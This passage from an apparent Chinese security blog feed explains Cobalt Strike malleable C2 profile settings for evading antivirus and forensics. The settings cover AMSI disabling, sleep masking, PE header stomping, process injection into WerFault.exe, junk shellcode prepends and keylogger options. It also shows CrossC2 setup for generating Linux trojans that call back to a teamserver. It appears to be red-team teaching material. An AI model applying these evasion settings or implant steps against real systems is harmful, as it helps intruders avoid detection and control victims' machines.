data-fancybox="true"/></div></div><p>CS会把<code>shellcode</code>写入到内存中去,并且创建线程执行这个<code>shellcode</code>,而这个<code>shellcode</code>又会申请一块新的内存,不会在原来的内存中进行操作.然后通过网络从<code>TeamServer</code>服务器上下载一个真正的<code>Beacon</code>,这个<code>Beacon</code>是被加密的.<strong>图例中”被加密的Payload”</strong>,这部分内容就会被写入到第二块内存中去,同时这部分内存还保存有一个可以被识别的解密程序,然后根据这个解密程序它会进行自解密变成两部分,一部分是反射DLL,另一部分是这个反射DLL的<code>Loader</code>.接着这个反射DLL又会申请一块新内存,并复制<code>Beacon</code>到新内存中去.最后我们想要执行命令的那些操作功能都将在第三块内存中进行.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">stage &#123;</span><br><span class="line">    <span class="comment"># CS 4.2 added allocator and MZ header overrides</span></span><br><span class="line">    <span class="built_in">set</span> allocator      <span class="string">&quot;VirtualAlloc&quot;</span>; <span class="comment"># 有三个内存分配函数,分别为:HeapAlloc、MapViewOfFile、VirtualAlloc. 杀毒会检测API的调用链，所以要对内存分配的函数进行自定义</span></span><br><span class="line">    <span class="comment">#set magic_mz_x86   &quot;MZRE&quot;; # 相当于花指令</span></span><br><span class="line">    <span class="comment">#set magic_mz_x64   &quot;MZAR&quot;; # 相当于花指令</span></span><br><span class="line">    <span class="built_in">set</span> magic_pe       <span class="string">&quot;NO&quot;</span>; <span class="comment"># 不覆盖Beacon的反射加载器使用的PE文件</span></span><br><span class="line">    <span class="built_in">set</span> userwx         <span class="string">&quot;false&quot;</span>;  <span class="comment"># 内存分配:正常的内存分配基本上不会出现可读、可写、可执行的情况，所以在溯源取证时就会去找存在可读、可写、可执行的内存块，当设置为 false 时内存状态就不可读、不可写、不可执行</span></span><br><span class="line">    <span class="built_in">set</span> stomppe        <span class="string">&quot;true&quot;</span>; <span class="comment"># 要求反射加载器在加载Beacon有效载荷后覆盖MZ(Microsoft Windows Portable Executable File)头、PE头和e_lfanew值,</span></span><br><span class="line">    <span class="built_in">set</span> obfuscate      <span class="string">&quot;true&quot;</span>; <span class="comment">#  obfuscate启用对反射DLL的导入表进行混淆,覆盖未使用的头部内容,并要求反射加载器在没有DLL头的情况下将Beacon复制到新内存中. 混淆的不是真正的恶意代码</span></span><br><span class="line">    <span class="built_in">set</span> cleanup        <span class="string">&quot;true&quot;</span>; <span class="comment"># 当我们得到真正的 Beacon 时前面两段内存会被清理掉</span></span><br><span class="line">    <span class="comment"># CS 3.12 Addition &quot;Obfuscate and Sleep&quot;</span></span><br><span class="line">    <span class="built_in">set</span> sleep_mask     <span class="string">&quot;true&quot;</span>; <span class="comment">#  比如当执行截图操作时，我们的命令指令是存储在第三块内存中的，所以我们在休眠时也容易被侦测到。当设置为true时，休眠状态下我们的命令指令就会被加密，不容易被识别。当然这也存在一块可以解密的代码，当睡眠过后又会根据该代码将加密内容解开，正常执行命令。</span></span><br><span class="line">    <span class="comment"># CS 4.1  </span></span><br><span class="line">    <span class="built_in">set</span> smartinject    <span class="string">&quot;true&quot;</span>; <span class="comment"># 内存侦测技术:在执行写入到内存的shellcode代码时，而shellcode就是一些与位置无关的代码，想要执行这些功能代码就要去寻找一些相应的API函数的位置，正常情况下是每次使用都要遍历出Kernel32 DLL 在内存中的位置。再找到相应函数的一个指针，通过指针调用相应函数执行相应功能。而这遍历的功能就被作为检测的特征了。当“smartinject”设置为true时，就不会每次都调用去遍历Kernel32 DLL了，在第一次遍历时就将函数的指针找到给下面所有需要调用的地方</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Make the Beacon Reflective DLL look like something else in memory</span></span><br><span class="line">    <span class="comment"># Values captured using peclone agaist a Windows 10 version of explorer.exe</span></span><br><span class="line">    <span class="built_in">set</span> checksum       <span class="string">&quot;0&quot;</span>; <span class="comment"># 设置Beacon的PE头部中的校验和值,</span></span><br><span class="line">    <span class="built_in">set</span> compile_time   <span class="string">&quot;11 Nov 2016 04:08:32&quot;</span>; <span class="comment"># 设置Beacon的PE头部中的编译时间</span></span><br><span class="line">    <span class="built_in">set</span> entry_point    <span class="string">&quot;650688&quot;</span>; <span class="comment"># 设置Beacon的PE头部中的入口点值</span></span><br><span class="line">    <span class="built_in">set</span> image_size_x86 <span class="string">&quot;4661248&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> image_size_x64 <span class="string">&quot;4661248&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> name           <span class="string">&quot;srv.dll&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> rich_header    <span class="string">&quot;\xbf\x7c\x40\x4a\x9c\x8e\xe1\xdd\x29\xce\x77\x1e\x1c\xee\x41\xab\x9d\xa8\xf5\x65\xec\xde\x71\x7b\xa6\x3f\xb8\x1c\x5c\x70\xaa\xd6\xca\x84\xd1\xc6\x2d\xad\x7c\xfe\x30\x6c\x1b\x98\x91\x6c\x63\xba\x03\x83\xbf\x4e\xbb\xe4\x33\xba\x01\xb3\xab\xf6\x01\x99\x13\x71&quot;</span>;  <span class="comment"># 添加到DLL中的元信息数据</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">##：模块踩踏</span></span><br><span class="line">   <span class="comment"># Cobalt Strike 3.11还在Beacon的反射加载器中添加了模块踩踏功能。启用后，Beacon的加载程序将避开VirtualAlloc，而是将一个DLC加载到当前进程中并覆盖其内存。</span></span><br><span class="line">  </span><br><span class="line">   <span class="comment"># 将module_x86设置为最喜欢的x86 DLC，以模块踩踏x86 Beacon。module_x64选项为x64 Beacon启用此功能。</span></span><br><span class="line">   <span class="comment"># 虽然这是一个强大的功能，但也需要注意！如果您加载的库不够大，无法托管Beacon，您将导致Beacon的进程崩溃。如果当前进程稍后加载相同的库（无论出于何种原因），您将使Beacon的进程崩溃。仔细选择。</span></span><br><span class="line">   <span class="comment"># 默认情况下，Beacon的加载程序使用VirtualAlloc分配内存。模块踩踏是一种替代方案。将module_x86设置为大约是Beacon有效负载本身两倍大的DLC。Beacon的x86加载程序将加载指定的DLC，找到其在内存中的位置并覆盖它。这是在Windows与磁盘上的文件关联的内存中初始化Beacon的一种方法。重要的是，您要驻留的应用程序不需要您选择的DLC。module_x64选项是同样的情况，但它会影响x64 Beacon。</span></span><br><span class="line">   <span class="comment"># 详细信息请参阅In-memorial Evasion视频系列。https://youtu.be/uWVH9l2GMw4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># set module_x64 &quot;netshell.dll&quot;;</span></span><br><span class="line">    <span class="comment"># set module_x86 &quot;netshell.dll&quot;;</span></span><br><span class="line"><span class="comment"># 启动一个正常的 DLL，把一个 DLL 映射到内存中间的时候，这是一个正常的映射流程，然而最后一步反射 DLL Loader 不是直接分配内存，他是在申请完新内存后再把这块内存替换成我们真正的 Beacon 内容</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment"># transform-x86和transform-x64块填充和转换Beacon的反射性动态链接库阶段。这些块支持三个命令：prepend、append和strsup。</span></span><br><span class="line">     <span class="comment"># 填充和转换Beacon的反射DLL阶段</span></span><br><span class="line">    transform-x86 &#123; <span class="comment"># transform the x86 rDLL stage</span></span><br><span class="line">        prepend <span class="string">&quot;\x66\x90\x47\x4c\x40\x0f\x1f\x00\x0f\x1f\x04\x00\x40\x66\x87\xdb\x49\x44\x0f\x1f\x00\x42\x66\x87\xd2\x87\xc9\x66\x0f\x1f\x04\x00\x43\x87\xdb\x45\x87\xd2\x41\x48\x66\x87\xc9\x0f\x1f\x00\x46\x90&quot;</span>; <span class="comment"># 前置</span></span><br><span class="line">        strrep <span class="string">&quot;ReflectiveLoader&quot;</span> <span class="string">&quot;execute&quot;</span>; <span class="comment"># 字符串替换</span></span><br><span class="line">        strrep <span class="string">&quot;This program cannot be run in DOS mode&quot;</span> <span class="string">&quot;&quot;</span>; <span class="comment"># Remove this text</span></span><br><span class="line">        strrep <span class="string">&quot;beacon.dll&quot;</span> <span class="string">&quot;&quot;</span>; <span class="comment"># Remove this text</span></span><br><span class="line">    &#125;</span><br><span class="line">    transform-x64 &#123; <span class="comment"># transform the x64 rDLL stage</span></span><br><span class="line">        prepend <span class="string">&quot;\x66\x90\x47\x4c\x40\x0f\x1f\x00\x0f\x1f\x04\x00\x40\x66\x87\xdb\x49\x44\x0f\x1f\x00\x42\x66\x87\xd2\x87\xc9\x66\x0f\x1f\x04\x00\x43\x87\xdb\x45\x87\xd2\x41\x48\x66\x87\xc9\x0f\x1f\x00\x46\x90&quot;</span>; <span class="comment"># prepend nops</span></span><br><span class="line">        strrep <span class="string">&quot;ReflectiveLoader&quot;</span> <span class="string">&quot;execute&quot;</span>; <span class="comment"># Change this text in the Beacon DLL</span></span><br><span class="line">        strrep <span class="string">&quot;beacon.x64.dll&quot;</span> <span class="string">&quot;&quot;</span>; <span class="comment"># Remove this text in the Beacon DLL</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stringw <span class="string">&quot;jQuery&quot;</span>; <span class="comment"># stringw用于将字符串&quot;JQuery&quot;添加到DLL中,是为了使DLL看起来更像正常的JavaScript库文件,从而减少被检测的可能性</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Post-Ex"><a href="#Post-Ex" class="headerlink" title="Post-Ex"></a>Post-Ex</h4><p>我们在执行截屏时不是直接在 Beacon 中执行的，而是起了一个傀儡进程，在傀儡进程中执行，再用命名管道将数据回传回来。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409261130985.png" data-fancybox="true"/></div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">post-ex &#123;</span><br><span class="line">        <span class="comment"># 指定了32位Beacon在执行后渗透(post-exploitation)任务时注入shellcode的目标程序路径</span></span><br><span class="line">        <span class="built_in">set</span> spawnto_x86 <span class="string">&quot;%windir%\\syswow64\\WerFault.exe&quot;</span>;</span><br><span class="line">        <span class="built_in">set</span> spawnto_x64 <span class="string">&quot;%windir%\\sysnative\\WerFault.exe&quot;</span>;</span><br><span class="line">        <span class="comment"># 启用对后渗透DLL的混淆</span></span><br><span class="line">        <span class="built_in">set</span> obfuscate <span class="string">&quot;true&quot;</span>;</span><br><span class="line">        <span class="comment"># 启用智能注入功能</span></span><br><span class="line">        <span class="built_in">set</span> smartinject <span class="string">&quot;true&quot;</span>;</span><br><span class="line">        <span class="comment"># 禁用AMSI</span></span><br><span class="line">        <span class="built_in">set</span> amsi_disable <span class="string">&quot;true&quot;</span>;</span><br><span class="line">        <span class="comment"># 定义了用于后渗透任务的命名管道名称,</span></span><br><span class="line">        <span class="built_in">set</span> pipename <span class="string">&quot;Winsock2\\CatalogChangeListener-###-0,&quot;</span>;</span><br><span class="line">        <span class="comment"># 设置键盘记录使用的函数</span></span><br><span class="line">        <span class="built_in">set</span> keylogger <span class="string">&quot;GetAsyncKeyState&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Process-Inject"><a href="#Process-Inject" class="headerlink" title="Process-Inject"></a>Process-Inject</h4><p>进程注入自定义的参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">process-inject &#123;</span><br><span class="line">    <span class="built_in">set</span> allocator <span class="string">&quot;NtMapViewOfSection&quot;</span>;  <span class="comment"># 设置远程进程中内存分配的方法为 NtMapViewOfSection</span></span><br><span class="line">    <span class="built_in">set</span> min_alloc <span class="string">&quot;17500&quot;</span>; <span class="comment"># 注入内容的最小内存分配大小</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Set memory permissions as permissions as initial=RWX, final=RX</span></span><br><span class="line">    <span class="built_in">set</span> startrwx <span class="string">&quot;false&quot;</span>; <span class="comment"># 注入内容的初始内存权限,False意味着不是读写执行</span></span><br><span class="line">    <span class="built_in">set</span> userwx   <span class="string">&quot;false&quot;</span>; <span class="comment"># 最终内存权限</span></span><br><span class="line">    transform-x86 &#123;</span><br><span class="line">        prepend <span class="string">&quot;\x66\x90\x47\x4c\x40\x0f\x1f\x00\x0f\x1f\x04\x00\x40\x66\x87\xdb\x49\x44\x0f\x1f\x00\x42\x66\x87\xd2\x87\xc9\x66\x0f\x1f\x04\x00\x43\x87\xdb\x45\x87\xd2\x41\x48\x66\x87\xc9\x0f\x1f\x00\x46\x90&quot;</span>; <span class="comment"># 在注入内容前添加NOP滑梯(\x90\x90是NOP指令的机器码)</span></span><br><span class="line">        <span class="comment">#append &quot;\x90\x90&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">    transform-x64 &#123;</span><br><span class="line">        prepend <span class="string">&quot;\x66\x90\x47\x4c\x40\x0f\x1f\x00\x0f\x1f\x04\x00\x40\x66\x87\xdb\x49\x44\x0f\x1f\x00\x42\x66\x87\xd2\x87\xc9\x66\x0f\x1f\x04\x00\x43\x87\xdb\x45\x87\xd2\x41\x48\x66\x87\xc9\x0f\x1f\x00\x46\x90&quot;</span>;</span><br><span class="line">        <span class="comment">#append &quot;\x90\x90&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    execute &#123;</span><br><span class="line">        CreateThread <span class="string">&quot;ntdll!RtlUserThreadStart+0x42&quot;</span>; <span class="comment"># 使用CreateThread函数创建一个线程,并使用特定的偏移量(+0x42)作为线程的入口点,这通常用于当前进程的自我注入</span></span><br><span class="line">        CreateThread; <span class="comment"># 这是一个通用的CreateThread方法,他尝试创建一个线程而不指定特定的入口点</span></span><br><span class="line">        NtQueueApcThread-s; <span class="comment"># 这个方法使用APC(异步过程调用)线程注入技术,-s表示这是一个&quot;Stealth&quot;版本的APC注入,可能更难以被检测</span></span><br><span class="line">        CreateRemoteThread; <span class="comment"># 这个方法尝试跨进程创建远程线程,这是一种常见的跨进程注入技术</span></span><br><span class="line">        RtlCreateUserThread;  <span class="comment"># 这个方法使用RtlCreateUserThread函数进行注入,它支持所有架构依赖的情况,例如32位到64位的注入,并且可以跨会话边界进行注入</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Prepend"><a href="#Prepend" class="headerlink" title="Prepend"></a>Prepend</h4><p><code>prepend.py</code>是一个Python脚本,它生成动态垃圾<code>shellcode</code>,该<code>shellcode</code>将附加在实际<code>shellcode</code>的开头.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 prepend.py </span><br><span class="line"></span><br><span class="line">\x66\x90\x47\x4c\x40\x0f\x1f\x00\x0f\x1f\x04\x00\x40\x66\x87\xdb\x49\x44\x0f\x1f\x00\x42\x66\x87\xd2\x87\xc9\x66\x0f\x1f\x04\x00\x43\x87\xdb\x45\x87\xd2\x41\x48\x66\x87\xc9\x0f\x1f\x00\x46\x90</span><br></pre></td></tr></table></figure><p>复制输出并将其粘贴到配置文件中(在<code>transform-x64</code>或<code>transform-x86</code>块内)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">transform-x64 &#123;</span><br><span class="line"> ...</span><br><span class="line"> prepend </span><br><span class="line"><span class="string">&quot;\x66\x90\x47\x4c\x40\x0f\x1f\x00\x0f\x1f\x04\x00\x40\x66\x87\xdb\x49\x44\x0f\x1f\x00\x42\x66\x87\xd2\x87\xc9\x66\x0f\x1f\x04\x00\x43\x87\xdb\x45\x87\xd2\x41\x48\x66\x87\xc9\x0f\x1f\x00\x46\x90&quot;</span>;</span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251727210.png" data-fancybox="true"/></div></div><h4 id="Rich-Header"><a href="#Rich-Header" class="headerlink" title="Rich_Header"></a>Rich_Header</h4><p><code>rich_header</code>生成动态<code>shellcode</code>,负责编译器插入的元信息.<code>Rich</code>标头是一个PE部分,用作Windows可执行文件生成环境的指纹.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 rich_header.py</span><br><span class="line"></span><br><span class="line">\xbf\x7c\x40\x4a\x9c\x8e\xe1\xdd\x29\xce\x77\x1e\x1c\xee\x41\xab\x9d\xa8\xf5\x65\xec\xde\x71\x7b\xa6\x3f\xb8\x1c\x5c\x70\xaa\xd6\xca\x84\xd1\xc6\x2d\xad\x7c\xfe\x30\x6c\x1b\x98\x91\x6c\x63\xba\x03\x83\xbf\x4e\xbb\xe4\x33\xba\x01\xb3\xab\xf6\x01\x99\x13\x71</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251727323.png" data-fancybox="true"/></div></div><h3 id="检查profile文件"><a href="#检查profile文件" class="headerlink" title="检查profile文件"></a>检查profile文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x c2lint </span><br><span class="line">./c2lint jquery-c2.4.5-jx.profile</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251727420.png" data-fancybox="true"/></div></div><p>使用profile文件启动cs:<code>./teamserver 83.***.***.145 123456 jquery-c2.4.5-jx.profile</code></p><h2 id="CS配置linux上线"><a href="#CS配置linux上线" class="headerlink" title="CS配置linux上线"></a>CS配置linux上线</h2><h3 id="下载-CrossC2"><a href="#下载-CrossC2" class="headerlink" title="下载 CrossC2"></a>下载 CrossC2</h3><p>cs默认是不支持上线linux主机的 , 但是可以通过安装<a href="https://github.com/gloxec/CrossC2/releases">CrossC2</a>插件实现,但也只支持<code>HTTPS beacon</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251727093.png" data-fancybox="true"/></div></div><p>将以上三个文件下载到cs安装目录下的<code>script</code>目录中,并进行解压</p><h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a><strong>安装插件</strong></h3><p>复制cs服务端目录下的<code>.cobaltstrike.beacon_keys</code>到<code>genCrossC2.Win.exe</code>所在的目录下</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251727300.png" data-fancybox="true"/></div></div><p>然后编辑<code>CrossC2-GithubBot-2021-11-02.cna</code>文件,填入相关路径<strong>Windows下双斜杠</strong></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251727890.png" data-fancybox="true"/></div></div><p>启动<code>cs</code>,使用客户端加载<code>cna</code>插件.选择<code>Script Manager</code>,添加<code>CrossC2.cna</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251727483.png" data-fancybox="true"/></div></div><p>如果成功安装,菜单栏会多出一项<code>CrossC2</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251728955.png" data-fancybox="true"/></div></div><h3 id="上线测试"><a href="#上线测试" class="headerlink" title="上线测试"></a>上线测试</h3><p>将服务端的<code>jquery-c2.4.5-jx.profile</code>文件保存到cs目录,然后新建一个https的监听</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251728750.png" data-fancybox="true"/></div></div><p>选择<code>CrossC2</code>—&gt;<code>Create CrossC2 Listener</code>—&gt;<code>Create Reverse HTTPS Listener</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251728711.png" data-fancybox="true"/></div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">host beacon port  <span class="comment"># 可以更改,未被占用即可</span></span><br><span class="line">Choose:c2profile  <span class="comment"># 选择从服务器上下载下来的jquery-c2.4.5-jx.profile文件</span></span><br><span class="line">Listener:         <span class="comment"># 选择HTTPS的监听器</span></span><br><span class="line">OutPutFileName    <span class="comment"># 木马文件名</span></span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251728208.png" data-fancybox="true"/></div></div><p>生成的木马在CS目录下,上传到Linux服务器并后台运行</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251728680.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409251728502.png" data-fancybox="true"/></div></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="Cobalt Strike" scheme="https://jiangjiyue.github.io/tags/Cobalt-Strike/"/>
    
    <category term="后渗透" scheme="https://jiangjiyue.github.io/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>CS-Cobalt Strike必备知识</title>
    <link href="https://jiangjiyue.github.io/2024/09/24/3c3f9499/"/>
    <id>https://jiangjiyue.github.io/2024/09/24/3c3f9499/</id>
    <published>2024-09-24T11:50:49.000Z</published>
    <updated>2024-09-24T11:53:50.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 15.71K </p>    </div>    <div class="cell" style="">    <p>代码: 8.69K, 文本: 2.47K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 49 分钟</p>    </div>    </div><h2 id="CS简介"><a href="#CS简介" class="headerlink" title="CS简介"></a>CS简介</h2><h3 id="什么是CS"><a href="#什么是CS" class="headerlink" title="什么是CS"></a>什么是CS</h3><blockquote><p>Cobalt Strike是一款基于java语言开发的渗透测试神器，常被业界人称为CS神器。它被广泛用于模拟<strong>高级持久性威胁</strong>(Advanced Persistent Threat，APT)和进行内网渗透。</p><p>分为<strong>客户端与服务端</strong> (CS架构的)，多用于团队协同作战，多个攻击者可以同时连接到一个团队服务器上，共享攻击资源与目标信息和sessions，可模拟APT做模拟对抗，进行内网渗透。 </p><p>Cobalt Strike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括:站点克隆，目标信息获取， </p><p>java执行，浏览器自动攻击等等</p></blockquote><p><a href="https://www.cobaltstrike.com/">官方网站</a></p><p><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm#_Toc65482705">官方文档</a></p><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241915663.png" data-fancybox="true"/></div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">logs                                <span class="comment"># 日志记录与目标主机的相关信息 </span></span><br><span class="line">resources                           <span class="comment"># 资源文件的目录</span></span><br><span class="line">scripts                             <span class="comment"># Cobalt Strike脚本的目录</span></span><br><span class="line">.cobaltstrike.beacon_keys           <span class="comment"># Cobalt Strike Beacon的密钥信息的文件</span></span><br><span class="line">agscript                            <span class="comment"># 拓展应用的脚本.用于自动化和定制化渗透测试过程</span></span><br><span class="line">c2lint                              <span class="comment"># 用于检查 profile 文件</span></span><br><span class="line">cobaltstrike,cobaltstrike.jar       <span class="comment"># 客户端程序(java跨平台)</span></span><br><span class="line">cobaltstrike.bat                    <span class="comment"># windows平台快速启动客户端的bat文件</span></span><br><span class="line">cobaltstrike.store                  <span class="comment"># Cobalt Strike的ssl证书文件</span></span><br><span class="line">CSAgent.jar                         <span class="comment"># 用于代理通信的Java可执行文件</span></span><br><span class="line">icon.jpg                            <span class="comment"># 图标</span></span><br><span class="line">peclone                             <span class="comment"># 克隆和操作PE文件的工具或脚本</span></span><br><span class="line">start.sh                            <span class="comment"># 用于在Unix/Linux系统上启动Cobalt Strike的Shell脚本</span></span><br><span class="line">teamserver                          <span class="comment"># 启动服务端的sh脚本</span></span><br></pre></td></tr></table></figure><h2 id="安装和运行"><a href="#安装和运行" class="headerlink" title="安装和运行"></a>安装和运行</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>团队服务器最好运行在 Linux平台上，服务端的关键文件是<code>teamserver</code>和<code>cobaltstrike.jar</code>，将这两个文件放在同一目录下运行 , teamserver要有可以运行的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> +x teamserver</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;host&gt; 必需参数 团队服务器IP</span></span><br><span class="line"><span class="comment"># &lt;password&gt; 必需参数 连接服务器的密码</span></span><br><span class="line"><span class="comment"># [/path/to/c2.profile] 可选参数 指定C2通信配置文件，体现其强大的扩展性</span></span><br><span class="line"><span class="comment"># [YYYY-MM-DD] 可选参数 所有payload的终止时间</span></span><br><span class="line">sudo ./teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]</span><br><span class="line"><span class="comment"># 一般启动Team Server</span></span><br><span class="line">sudo ./teamserver 192.168.74.131 3wHv<span class="comment">#4WeFjH@kilayu#s    # 设置强密码，否则容易被爆破，参考附录</span></span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241915074.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241915032.png" data-fancybox="true"/></div></div><p>默认端口为50050。如果要修改端口号需编辑<code>teamserver</code>文件<code>sudo vim teamserver</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td 